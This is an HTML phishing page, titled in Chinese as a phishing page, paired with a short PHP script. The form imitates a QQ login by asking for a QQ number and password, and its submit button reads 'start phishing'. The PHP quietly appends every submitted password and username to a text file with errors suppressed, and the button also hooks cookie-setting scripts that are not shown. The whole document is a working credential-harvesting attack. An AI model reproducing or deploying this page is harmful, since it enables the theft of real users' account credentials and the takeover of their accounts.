<html>
    <head>
        <title>钓鱼网页</title>
        <script src="createcooki.js"></script>
        <script src="ExamKeyWords.js"></script>
    </head>
    <body>
        <form method='GET' action="Xss-attack.php">
            <center>请输入你的QQ号：<input type="text" id="user" name=username></center>
            <hr>
            <br>
            <center>请输入密码：<input id="password" type="text"  name=password ></center>
            <hr>
            <br>
            <center><input type="submit" value="开始钓鱼了" onclick="ExamPassword()" onmouseover="SetYourcookie()"></center>
        </form>
    </body>
</html>

<?php
    error_reporting(0);
    $Password=$_GET["password"];
    $Username=$_GET["username"];
    $filename=fopen("password.txt","a");
    fwrite($filename,$Password."+".$Username."\n");
    fclose($filename);
?>